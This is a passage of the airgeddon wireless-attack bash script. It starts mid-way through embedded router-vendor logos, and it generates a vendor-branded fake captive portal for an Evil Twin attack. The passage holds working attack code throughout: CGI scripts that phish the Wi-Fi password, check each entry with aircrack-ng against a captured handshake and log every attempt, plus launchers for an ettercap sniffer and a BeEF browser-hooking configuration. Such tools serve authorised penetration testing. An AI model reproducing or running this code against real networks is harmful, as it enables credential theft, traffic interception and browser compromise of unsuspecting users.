zLjUwMmgxMS45MDdjLS45NTUgNy4zMzUtMy41MDYgMTMuNTAyLTcuNDQgMTkuNTYxIDIuNDQzIDMuMjk3IDMuNzIgNi4wNjIgNC42NzYgMTAuMTAzLjc0NSA1LjYzMi4xMDYgMTAuNjMyLTEuNDg4IDE2LjA1M3oiIGZpbGw9IiMzNDY0YTYiLz48L2c+PC9zdmc+DQo='
										["ZTE"]='#2C990D #E1F1D4 #CCCCCC data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjwhLS0gQ3JlYXRlZCB3aXRoIElua3NjYXBlIChodHRwOi8vd3d3Lmlua3NjYXBlLm9yZy8pIC0tPgoKPHN2ZwogICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgIHhtbG5zOmNjPSJodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9ucyMiCiAgIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIKICAgeG1sbnM6c3ZnPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIKICAgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIgogICB4bWxuczpzb2RpcG9kaT0iaHR0cDovL3NvZGlwb2RpLnNvdXJjZWZvcmdlLm5ldC9EVEQvc29kaXBvZGktMC5kdGQiCiAgIHhtbG5zOmlua3NjYXBlPSJodHRwOi8vd3d3Lmlua3NjYXBlLm9yZy9uYW1lc3BhY2VzL2lua3NjYXBlIgogICB3aWR0aD0iMTEyLjg4ODc2bW0iCiAgIGhlaWdodD0iNTQuNTUzNDIxbW0iCiAgIHZpZXdCb3g9IjAgMCAzOTkuOTk5NTMgMTkzLjI5OTUyIgogICBpZD0ic3ZnMiIKICAgdmVyc2lvbj0iMS4xIgogICBpbmtzY2FwZTp2ZXJzaW9uPSIwLjkxIHIxMzcyNSIKICAgc29kaXBvZGk6ZG9jbmFtZT0iWlRFX2xvZ28uc3ZnIj4KICA8ZGVmcwogICAgIGlkPSJkZWZzNCIgLz4KICA8c29kaXBvZGk6bmFtZWR2aWV3CiAgICAgaWQ9ImJhc2UiCiAgICAgcGFnZWNvbG9yPSIjZmZmZmZmIgogICAgIGJvcmRlcmNvbG9yPSIjNjY2NjY2IgogICAgIGJvcmRlcm9wYWNpdHk9IjEuMCIKICAgICBpbmtzY2FwZTpwYWdlb3BhY2l0eT0iMC4wIgogICAgIGlua3NjYXBlOnBhZ2VzaGFkb3c9IjIiCiAgICAgaW5rc2NhcGU6em9vbT0iMC4xNzUiCiAgICAgaW5rc2NhcGU6Y3g9IjkyNC45NjIxMyIKICAgICBpbmtzY2FwZTpjeT0iMTAxMy4yMjg2IgogICAgIGlua3NjYXBlOmRvY3VtZW50LXVuaXRzPSJweCIKICAgICBpbmtzY2FwZTpjdXJyZW50LWxheWVyPSJsYXllcjEiCiAgICAgc2hvd2dyaWQ9ImZhbHNlIgogICAgIGZpdC1tYXJnaW4tdG9wPSIwIgogICAgIGZpdC1tYXJnaW4tbGVmdD0iMCIKICAgICBmaXQtbWFyZ2luLXJpZ2h0PSIwIgogICAgIGZpdC1tYXJnaW4tYm90dG9tPSIwIgogICAgIGlua3NjYXBlOndpbmRvdy13aWR0aD0iMTYwMCIKICAgICBpbmtzY2FwZTp3aW5kb3ctaGVpZ2h0PSI4MzciCiAgICAgaW5rc2NhcGU6d2luZG93LXg9Ii04IgogICAgIGlua3NjYXBlOndpbmRvdy15PSItOCIKICAgICBpbmtzY2FwZTp3aW5kb3ctbWF4aW1pemVkPSIxIiAvPgogIDxtZXRhZGF0YQogICAgIGlkPSJtZXRhZGF0YTciPgogICAgPHJkZjpSREY+CiAgICAgIDxjYzpXb3JrCiAgICAgICAgIHJkZjphYm91dD0iIj4KICAgICAgICA8ZGM6Zm9ybWF0PmltYWdlL3N2Zyt4bWw8L2RjOmZvcm1hdD4KICAgICAgICA8ZGM6dHlwZQogICAgICAgICAgIHJkZjpyZXNvdXJjZT0iaHR0cDovL3B1cmwub3JnL2RjL2RjbWl0eXBlL1N0aWxsSW1hZ2UiIC8+CiAgICAgICAgPGRjOnRpdGxlPjwvZGM6dGl0bGU+CiAgICAgIDwvY2M6V29yaz4KICAgIDwvcmRmOlJERj4KICA8L21ldGFkYXRhPgogIDxnCiAgICAgaW5rc2NhcGU6bGFiZWw9IkViZW5lIDEiCiAgICAgaW5rc2NhcGU6Z3JvdXBtb2RlPSJsYXllciIKICAgICBpZD0ibGF5ZXIxIgogICAgIHRyYW5zZm9ybT0idHJhbnNsYXRlKDExOTguNTMzNiwtMTc5NS4zMDI5KSI+CiAgICA8cGF0aAogICAgICAgc3R5bGU9ImZpbGw6IzAwYmZmZTtmaWxsLW9wYWNpdHk6MSIKICAgICAgIGQ9Im0gLTExODcuMDMwMywxOTg4LjQxMDQgYyAtNC4xODU3LC0wLjU0MyAtOC4wMDc0LC0zLjE5MjEgLTkuOTU2OCwtNi45MDE3IC0xLjg3NzEsLTMuNTcyMiAtMi4wNTcyLC03LjkxODEgLTAuNDc1NiwtMTEuNDc1MSAwLjI4MTIsLTAuNjMyMyAxMy42NjA4LC0yMS43OTQ0IDI5LjczMjYsLTQ3LjAyNjkgMTYuMDcxNywtMjUuMjMyNiAzNS4xNTE0LC01NS4xODg3IDQyLjM5OTMsLTY2LjU2OTIgNy4yNDc5LC0xMS4zODA2IDEzLjQwMjEsLTIxLjI0MzQgMTMuNjc1OSwtMjEuOTE3NSAxLjAxMzEsLTIuNDkzOSAwLjc4NzYsLTUuNTc1MSAtMC41ODMzLC03Ljk3MTIgLTAuNzM0LC0xLjI4MyAtMi41MDg4LC0zLjAxNzkgLTMuNzE4NiwtMy42MzUxIC0yLjE3MDgsLTEuMTA3NSAtMC44OTI0LC0xLjA2NjkgLTMzLjY4NTMsLTEuMDcwOCAtMzMuOTQ3NSwwIC0zMS45MzA3LDAuMDgxIC0zNS4xMTQ3LC0xLjQ4ODIgLTUuNTczOCwtMi43NDc3IC04LjUzMDksLTkuNDkzMyAtNi43NzczLC0xNS40NjAzIDAuOTgwOSwtMy4zMzc2IDMuNzY0MiwtNi42OTk0IDYuNzcwMiwtOC4xNzczIDMuMTI1MywtMS41MzY1IC0xLjY1MTQsLTEuNDI0NiA1OC4yNSwtMS4zNjQ0IGwgNTMuODgzMSwwLjA1NCAxLjM1ODYsMC40NjQ3IGMgNC4wNTA0LDEuMzg1NiA3LjM2MjgsNC43Mzc3IDguNjI4Myw4LjczMTYgMC4zNzE4LDEuMTczNiAwLjQ2MzUsMS45NTkzIDAuNDYzMiwzLjk3MTIgLTVlLTQsMi43MzkzIC0wLjQxMjMsNC40NyAtMS41MTcsNi4zNzQ4IC0wLjMsMC41MTczIC0xOS41NDI1LDMwLjc1NTYgLTQyLjc2MTEsNjcuMTk2MiAtMjMuMjE4NiwzNi40NDA2IC00Mi4zOTgsNjYuNjY3NSAtNDIuNjIwOCw2Ny4xNzA3IC0wLjUyNjEsMS4xODg0IC0wLjcwNjcsMy44MDI5IC0wLjM2NDQsNS4yNzM4IDAuNjUxNSwyLjc5ODkgMi41NzE1LDUuMTcwNiA1LjIwMzEsNi40Mjc0IGwgMS41OTIyLDAuNzYwNCAzNC41OTA5LDAuMTA3OSBjIDM4LjY1MDQsMC4xMjA3IDM1LjM4NDQsLTAuMDE2IDM4LjY2NjYsMS42MTUxIDIuMDc1NSwxLjAzMTIgNC40MDE3LDMuMzI3MSA1LjQ5NjYsNS40MjQ5IDMuMjM1NCw2LjE5OSAxLjQwMjksMTMuNTM3OSAtNC4zMzkyLDE3LjM3ODUgLTEuNzcsMS4xODM5IC0zLjUxMzMsMS44MjQ1IC01Ljc1NTYsMi4xMTUxIC0xLjkzMjYsMC4yNTA1IC0xMTEuMTA3NiwwLjI0MTggLTExMy4wNDA5LC0wLjAxIHogbSAyODUuNzIzNTYsLTAuMDg3IGMgLTEuNzA5MjEsLTAuMzExOCAtNC4xNjkxNSwtMS4zOTkzIC01LjU0OTMyLC0yLjQ1MzEgLTEuNDE4NjUsLTEuMDgzMiAtMy4wMTE3MSwtMy4wMzA0IC0zLjgwMTcsLTQuNjQ2OCAtMS40NzYzMSwtMy4wMjA4IC0xLjM1ODIsNS4xNDI5IC0xLjI5ODk5LC04OS43ODY3IGwgMC4wNTM1LC04NS43ODggMC41NzAzNiwtMS41NjI5IGMgMC43MTA3NiwtMS45NDc1IDIuMTU1NzIsLTQuMDg2OSAzLjY4OTcyLC01LjQ2MjkgMS40MDkwMSwtMS4yNjQgNC40NDgzMiwtMi43ODg0IDYuMTc2NDksLTMuMDk4IDAuODUwNTQsLTAuMTUyMyAxNS40MDE0NiwtMC4yMjIxIDQ2LjMxNDIsLTAuMjIyMSA0NC4yMDMxMSwwIDQ1LjEwNTIxLDAuMDEgNDYuNjg4MzksMC40MTI5IDIuNDQ1NzgsMC42MjU1IDMuOTUzOTgsMS41MTk1IDUuOTg4NTgsMy41NSAxLjM2OTMyLDEuMzY2NiAxLjk2NjI3LDIuMTUyMSAyLjU0NzYyLDMuMzUyNCAxLjUzNzk3LDMuMTc1MiAxLjc4NjI1LDYuODYxOSAwLjY4MzQsMTAuMTQ3MyAtMC43MDIsMi4wOTEyIC0xLjM2OTU3LDMuMjA3OSAtMi44ODgyMSw0LjgzMTMgLTEuNTgwODgsMS42OSAtMy4zNjgxNSwyLjg1NzEgLTUuNDc1MjksMy41NzU1IGwgLTEuNjcyMDcsMC41NzAxIC0zMS4wMzc3NywwLjEwNjYgYyAtMjkuMzk5MjgsMC4xMDA5IC0zMS4wOTg0NCwwLjEyNjggLTMyLjE4NzMxLDAuNDkwNCAtNC42MTQ2NiwxLjU0MSAtOC4yNTU2OSw1LjM2OTggLTkuMjkzNTksOS43NzI4IC0wLjQ2NjY5LDEuOTc5OCAtMC40Njk5MSwzNC4xMTc0IC0wLjAwNCwzNi4wOTUzIDEuMTIwMDgsNC43NTExIDQuOTg1MDIsOC42MjYyIDkuODQyNjEsOS44Njg2IDEuNTU5MzksMC4zOTg4IDIuNDIwNDIsMC40MTIzIDI2LjYwNjg5LDAuNDE1OCAyNy45MjY0NywwIDI2LjUzOTM0LC0wLjA2NiAyOS42OTA5NiwxLjQ4ODIgMy4xNzg4MSwxLjU2NyA1Ljc1ODczLDQuNjc2NiA2LjgyNTcsOC4yMjcxIDAuNjA0NzYsMi4wMTIzIDAuNTE1MDYsNS41OTY1IC0wLjE5MzU1LDcuNzMzMyAtMS4yODkyNiwzLjg4NzggLTQuNTgzMiw3LjE4ODkgLTguNTA2MTYsOC41MjQ1IGwgLTEuMzU4NTYsMC40NjI2IC0yNi4xMjYwNiwwLjEwNDYgLTI2LjEyNjA3LDAuMTA0NiAtMS44MDEyLDAuNjQ0OSBjIC0zLjUzMDkyLDEuMjY0MSAtNi4xOTY0OSwzLjU2NzQgLTcuNzE5NzcsNi42NzA0IC0xLjUwODkxLDMuMDczOSAtMS40NTE5OCwyLjI0OTggLTEuNDUxOTgsMjEuMDE1OSAwLDE1Ljk3ODIgMC4wMjEsMTYuOTM0MyAwLjQwNDM1LDE4LjQzMzMgMS4yMTcwMSw0Ljc1ODUgNC43NTIwMiw4LjI3OTYgOS43MzI1Niw5LjY5NDUgMS4xNTg3MywwLjMyOTEgMy40NzgyLDAuMzUyMiAzMC41MTUyNSwwLjMwMzEgMjAuODkxODcsLTAuMDM4IDI5Ljc5MzU2LDAuMDE1IDMxLjEyMjQ2LDAuMTg0MyA1LjgzMjE3LDAuNzQzNiAxMC4zNTA1OCw0Ljg3IDExLjUwMDAyLDEwLjUwMjMgMC40MTQ0NSwyLjAzMDkgMC40MTQ4NywzLjMxOTYgMC4wMDIsNS4zMTk4IC0wLjk4NzQ0LDQuNzgwNiAtNC4yNjg5NSw4LjQ2MzYgLTguOTU3NDEsMTAuMDUzNCBsIC0xLjY4ODQ2LDAuNTcyNSAtNDUuMTQ1ODQsMC4wMzUgYyAtMzYuODEyOTIsMC4wMjkgLTQ1LjQyNzUsLTAuMDE2IC00Ni42NzE4NCwtMC4yNDMxIHogbSAtODguNDUyMTgsLTAuMDQxIGMgLTEuMTQ0NzQsLTAuMTkxNCAtMy4zMTEyLC0wLjk4NzMgLTQuNTk4MTksLTEuNjg5MyAtMS43OTI1OCwtMC45Nzc5IC00LjcwNTcsLTMuODg4MyAtNS42OTU4OSwtNS42OTA3IC0wLjQxMDUsLTAuNzQ3MiAtMC45NjYzLC0yLjAxNjkgLTEuMjM1MiwtMi44MjE2IGwgLTAuNDg4NywtMS40NjMgLTAuMTA4NSwtNzEuNzk0NSBjIC0wLjA5OSwtNjUuMzU0MyAtMC4xMzg3LC03MS44OTEyIC0wLjQ0NjQsLTcyLjg3MzIgLTEuNDg5OCwtNC43NTQ1IC00LjM4MjQsLTcuODI4OSAtOC44NTI1LC05LjQwODUgbCAtMS42NzAxLC0wLjU5MDIgLTE0LjIxMjUsLTAuMTEzMSBjIC0xMy4wMDIsLTAuMTAzNiAtMTQuMzEwNSwtMC4xNDU2IC0xNS4zNjIyLC0wLjQ5MzggLTQuNzE1LC0xLjU2MSAtOC4xNzEsLTUuMjY4MiAtOS4yMDI2LC05Ljg3MTMgLTAuMzIzMSwtMS40NDE5IC0wLjI2NDksLTQuNzg2NCAwLjEwODgsLTYuMjQyNCAxLjA3NDEsLTQuMTg2IDQuMjAzNCwtNy41OTUzIDguNDY2OCwtOS4yMjQ0IGwgMS41Njc2LC0wLjU5OSA1My42MTA2NiwtMC4wNiBjIDM3LjgyMDk1LC0wLjA0MiA1NC4wMTA4MSwwLjAxIDU0Ljk2OTI0LDAuMTY3MiAxLjgyOTQ4LDAuMzA1MyA0LjgyMDUxLDEuNzg1NSA2LjMxMjc1LDMuMTIzOSAxLjU2ODE1LDEuNDA2NSAzLjA5OTUxLDMuNzI5NiAzLjczMjI5LDUuNjYxOCAwLjQzOTY3LDEuMzQyNiAwLjUwOTM1LDEuOTQ1OCAwLjUwNTk5LDQuMzc4NyAtMC4wMDMsMi40MTQ5IC0wLjA3MzgsMy4wMTc0IC0wLjQ4ODY1LDQuMTgwMiAtMS4zOTgyNiwzLjkxODcgLTQuNjE3NDgsNy4wNjc4IC04LjU5OTMyLDguNDEyIC0xLjMzMDQ0LDAuNDQ5MSAtMS42NTI2NywwLjQ2MTEgLTE1LjU3MTEzLDAuNTc3OSAtMTUuODE3NjQsMC4xMzI4IC0xNC45NDE4NiwwLjA1MyAtMTcuOTU5NjEsMS42MzA1IC0yLjk5NDQ4LDEuNTY1MiAtNS40MzI1Nyw0LjU0IC02LjYyNjgsOC4wODU4IC0wLjIzMzExLDAuNjkyMSAtMC4zMDAwMSwxMy4xOTg2IC0wLjM4ODU3LDcyLjYzMDUgLTAuMTAxNTMsNjguMTQ2OSAtMC4xMjU5NSw3MS44NTgxIC0wLjQ4MDM0LDczLjA0ODUgLTEuNjI0MTksNS40NTU0IC01LjYxNTIsOS40NjI2IC0xMC43MjYwNSwxMC43Njk4IC0xLjUyMzksMC4zODk3IC00Ljk4NjQ4LDAuNTMxMSAtNi41NjA4OCwwLjI2NzggeiIKICAgICAgIGlkPSJwYXRoMzcyMiIKICAgICAgIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIC8+CiAgPC9nPgo8L3N2Zz4K'
									)

		hex_val1=$(echo "${bssid}" | cut -c 1-2)
		hex_val2=$(echo "${bssid}" | cut -c 4-5)
		hex_val3=$(echo "${bssid}" | cut -c 7-8)
		cp_mac_address="${hex_val1}${hex_val2}${hex_val3}"
		cp_vendor_detected="0"
		routervendor=""
		for routervendor in "${!cp_router_vendors[@]}"; do
			if [[ "${cp_router_vendors[${routervendor}]}" =~ ${cp_mac_address} ]]; then
				echo
				language_strings "${language}" 713 "blue"

				captive_portal_brand="${routervendor}"
				captive_portal_data="${cp_router_colors[$routervendor]}"
				captive_portal_bg_color=$(echo "${captive_portal_data}" | cut -d " " -f 1)
				captive_portal_button_color=$(echo "${captive_portal_data}" | cut -d " " -f 2)
				captive_portal_shadow_color=$(echo "${captive_portal_data}" | cut -d " " -f 3)
				captive_portal_img=$(echo "${captive_portal_data}" | cut -d " " -f 4)
				captive_portal_logo='\t\t\t\t<div class="logo">\n\t\t\t\t\t\t\t<img src="'${captive_portal_img}'" title="Logo" style="display: block; margin: auto; width: 200px;"/>\n\t\t\t\t\t\t</div>'
				cp_vendor_detected="1"
				break
			fi
		done

		if [ "${cp_vendor_detected}" = "0" ]; then
			echo
			language_strings "${language}" 714 "yellow"

			captive_portal_brand="airgeddon_default"
			captive_portal_bg_color="#1b5e20"
			captive_portal_button_color="#43a047"
			captive_portal_shadow_color="#69f0ae"
			captive_portal_logo=""
		fi
	else
		captive_portal_brand="airgeddon_default"
		captive_portal_bg_color="#1b5e20"
		captive_portal_button_color="#43a047"
		captive_portal_shadow_color="#69f0ae"
		captive_portal_logo=""
	fi
}

#Create captive portal files. Cgi bash scripts, css and js file
function set_captive_portal_page() {

	debug_print

	{
	echo -e "body * {"
	echo -e "\tbox-sizing: border-box;"
	echo -e "\tfont-family: Helvetica, Arial, sans-serif;"
	echo -e "}\n"
	echo -e ".button {"
	echo -e "\tcolor: #ffffff;"
	echo -e "\tbackground-color: ${captive_portal_button_color};"
	echo -e "\tborder-radius: 5px;"
	echo -e "\tcursor: pointer;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e ".content {"
	echo -e "\twidth: 100%;"
	echo -e "\tbackground-color: ${captive_portal_bg_color};"
	echo -e "\tpadding: 20px;"
	echo -e "\tmargin: 15px auto 0;"
	echo -e "\tborder-radius: 15px;"
	echo -e "\tcolor: #ffffff;"
	echo -e "}\n"
	echo -e ".title {"
	echo -e "\ttext-align: center;"
	echo -e "\tmargin-bottom: 15px;"
	echo -e "}\n"
	echo -e "#password {"
	echo -e "\twidth: 100%;"
	echo -e "\tmargin-bottom: 5px;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e "#password:hover,"
	echo -e "#password:focus {"
	echo -e "\tbox-shadow: 0 0 10px ${captive_portal_shadow_color};"
	echo -e "}\n"
	echo -e ".bold {"
	echo -e "\tfont-weight: bold;"
	echo -e "}\n"
	echo -e "#showpass {"
	echo -e "\tvertical-align: top;"
	echo -e "}\n"
	echo -e "@media screen and (min-width: 1000px) {"
	echo -e "\t.content {"
	echo -e "\t\twidth: 50%;"
	echo -e "\t\tposition: absolute;"
	echo -e "\t\ttop: 50%;"
	echo -e "\t\tleft: 50%;"
	echo -e "\t\ttransform: translate(-50%, -50%);"
	echo -e "\t}"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${cssfile}"

	{
	echo -e "(function() {\n"
	echo -e "\tvar onLoad = function() {"
	echo -e "\t\tvar formElement = document.getElementById(\"loginform\");"
	echo -e "\t\tif (formElement != null) {"
	echo -e "\t\t\tvar password = document.getElementById(\"password\");"
	echo -e "\t\t\tvar showpass = function() {"
	echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");"
	echo -e "\t\t\t}"
	echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);"
	echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n"
	echo -e "\t\t\tvar validatepass = function() {"
	echo -e "\t\t\t\tif (password.value.length < 8) {"
	echo -e "\t\t\t\t\talert(\"${et_misc_texts[${captive_portal_language},16]}\");"
	echo -e "\t\t\t\t}"
	echo -e "\t\t\t\telse {"
	echo -e "\t\t\t\t\tformElement.submit();"
	echo -e "\t\t\t\t}"
	echo -e "\t\t\t}"
	echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);"
	echo -e "\t\t}"
	echo -e "\t};\n"
	echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);"
	echo -e "})();\n"
	echo -e "function redirect() {"
	echo -e "\tdocument.location = \"${indexfile}\";"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${jsfile}"

	{
	echo -e "#!/usr/bin/env bash"
	echo -e "echo '<!DOCTYPE html>'"
	echo -e "echo '<html>'"
	echo -e "echo -e '\t<head>'"
	echo -e "echo -e '\t\t<meta name=\"viewport\" content=\"width=device-width\"/>'"
	echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
	echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
	echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
	echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
	echo -e "echo -e '\t</head>'"
	echo -e "echo -e '\t<body>'"
	echo -e "echo -e '\t\t<img src=\"${pixelfile}\" style=\"display: none;\"/>'"
	echo -e "echo -e '\t\t<div class=\"content\">'"
	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
	if [ "${advanced_captive_portal}" -eq 1 ]; then
		echo -e "echo -e '${captive_portal_logo}'"
	fi
	echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
	echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
	echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
	echo -e "echo -e '\t\t\t\t</div>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
	echo -e "echo -e '\t\t\t\t<label>'"
	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\"/><br/>'"
	echo -e "echo -e '\t\t\t\t</label>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},12]} <input type=\"checkbox\" id=\"showpass\"/></p>'"
	echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[${captive_portal_language},13]}\"/>'"
	echo -e "echo -e '\t\t\t</form>'"
	echo -e "echo -e '\t\t</div>'"
	echo -e "echo -e '\t</body>'"
	echo -e "echo '</html>'"
	echo -e "exit 0"
	} >> "${tmpdir}${webdir}${indexfile}"

	base64 -d <<< "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdj+P///38ACfsD/QVDRcoAAAAASUVORK5CYII=" > "${tmpdir}${webdir}${pixelfile}"

	exec 4>"${tmpdir}${webdir}${checkfile}"

	cat >&4 <<-EOF
		#!/usr/bin/env bash

		echo '<!DOCTYPE html>'
		echo '<html>'
		echo -e '\t<head>'
		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
		echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
		echo -e '\t</head>'
		echo -e '\t<body>'
		echo -e '\t\t<div class="content">'
		echo -e '\t\t\t<center><p>'

		POST_DATA=\$(cat /dev/stdin)
		if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
			POST_DATA=\${POST_DATA#*=}
			password=\${POST_DATA//+/ }
			password=\${password//[*&\/?<>]}
			password=\$(printf '%b' "\${password//%/\\\x}")
			password=\${password//[*&\/?<>]}
		fi

		if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
			echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
			if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
				echo '${et_misc_texts[${captive_portal_language},18]}'
				et_successful=1
			else
				echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
				echo '${et_misc_texts[${captive_portal_language},17]}'
				et_successful=0
			fi
		elif [[ "\${#password}" -gt 0 ]] && [[ "\${#password}" -lt 8 ]]; then
			echo '${et_misc_texts[${captive_portal_language},26]}'
			et_successful=0
		else
			echo '${et_misc_texts[${captive_portal_language},14]}'
			et_successful=0
		fi

		echo -e '\t\t\t</p></center>'
		echo -e '\t\t</div>'
		echo -e '\t</body>'
		echo '</html>'

		if [ "\${et_successful}" -eq 1 ]; then
			exit 0
		else
			echo '<script type="text/javascript">'
			echo -e '\tsetTimeout("redirect()", 3500);'
			echo '</script>'
			exit 1
		fi
	EOF

	exec 4>&-
	sleep 3
}

#Launch lighttpd webserver for captive portal Evil Twin attack
function launch_webserver() {

	debug_print

	recalculate_windows_sizes
	lighttpd_window_position=${g4_bottomright_window}
	manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "lighttpd -D -f \"${tmpdir}${webserver_file}\""
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}

#Launch ettercap sniffer
function launch_ettercap_sniffing() {

	debug_print

	recalculate_windows_sizes
	case ${et_mode} in
		"et_sniffing")
			sniffing_scr_window_position=${g3_bottomright_window}
		;;
	esac
	ettercap_cmd="ettercap -i ${interface} -q -T -z -S -u"
	if [ "${ettercap_log}" -eq 1 ]; then
		ettercap_cmd+=" -l \"${tmp_ettercaplog}\""
	fi

	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer\"" "${ettercap_cmd}" "Sniffer"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${ettercap_cmd}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}

#Create configuration file for beef
function set_beef_config() {

	debug_print

	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1

	beef_db_path=""
	if [ -d "${beef_path}db" ]; then
		beef_db_path="db/${beef_db}"
	else
		beef_db_path="${beef_db}"
	fi

	local permitted_ui_subnet
	local permitted_ui_ipv6
	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_fixed_beef_iptables_issue}"; then
		permitted_ui_subnet="${loopback_ip}/${ip_mask_cidr}"
		permitted_ui_ipv6="${loopback_ipv6}"
	else
		permitted_ui_subnet="${any_ip}/${any_mask_cidr}"
		permitted_ui_ipv6="${any_ipv6}"
	fi

	local permitted_hooking_subnet
	local beef_panel_restriction
	if compare_floats_greater_or_equal "${beef_version}" "${beef_needed_brackets_version}"; then
		permitted_hooking_subnet="        permitted_hooking_subnet: [\"${et_ip_range}/${std_c_mask_cidr}\", \"${any_ipv6}\"]"
		beef_panel_restriction="        permitted_ui_subnet: [\"${permitted_ui_subnet}\", \"${permitted_ui_ipv6}\"]"
	else
		permitted_hooking_subnet="        permitted_hooking_subnet: \"${et_ip_range}/${std_c_mask_cidr}\""
		beef_panel_restriction="        permitted_ui_subnet: \"${permitted_ui_subnet}\""
	fi

	{
	echo -e "beef:"
	echo -e "    version: 'airgeddon integrated'"
	echo -e "    debug: false"
	echo -e "    client_debug: false"
	echo -e "    crypto_default_value_length: 80"
	echo -e "    restrictions:"
	echo -e "${permitted_hooking_subnet}"
	echo -e "${beef_panel_restriction}"
	echo -e "    http:"
	echo -e "        debug: false"
	echo -e "        host: \"${any_ip}\""
	echo -e "        port: \"${beef_port}\""
	echo -e "        dns_host: \"localhost\""
	echo -e "        dns_port: ${dns_port}"
	echo -e "        web_ui_basepath: \"/ui\""
	echo -e "        hook_file: \"/${jshookfile}\""
	echo -e "        hook_session_name: \"BEEFHOOK\""
	echo -e "        session_cookie_name: \"BEEFSESSION\""
	echo -e "        web_server_imitation:"
	echo -e "            enable: true"
	echo -e "            type: \"apache\""
	echo -e "            hook_404: false"
	echo -e "            hook_root: false"
	echo -e "        websocket:"
	echo -e "            enable: false"
	echo -e "    database:"
	echo -e "        driver: \"sqlite\""
	echo -e "        file: \"${beef_db_path}\""
	echo -e "        db_file: \"${beef_db_path}\""
	echo -e "    credentials:"
	echo -e "        user: \"beef\""
	echo -e "        passwd: \"${beef_pass}\""
	echo -e "    autorun:"
	echo -e "        enable: true"
	echo -e "        result_poll_interval: 300"
	echo -e "        result_poll_timeout: 5000"
	echo -e "        continue_after_timeout: true"
	echo -e "    dns_hostname_lookup: false"
	echo -e "    integration:"
	echo -e "        phishing_frenzy:"
	echo -e "            enable: false"
	echo -e "    extension:"
	echo -e "        requester:"
	echo -e "            enable: true"
	echo -e "        proxy:"
	echo -e "            enable: true"
	echo -e "            key: \"beef_key.pem\""
	echo -e "            cert: \"beef_cert.pem\""
	echo -e "        metasploit:"
	echo -e "            enable: false"
	echo -e "        social_engineering:"
	echo -e "            enable: true"
	echo -e "        evasion:"
	echo -e "            enable: false"
	echo -e "        console:"
	echo -e "            shell:"
	echo -e "                enable: false"
	echo -e "        ipec:"
	echo -e "            enable: true"
	echo -e "        dns:"
	echo -e "            enable: false"
	echo -e "        dns_rebinding:"
	echo -e "            enable: false"
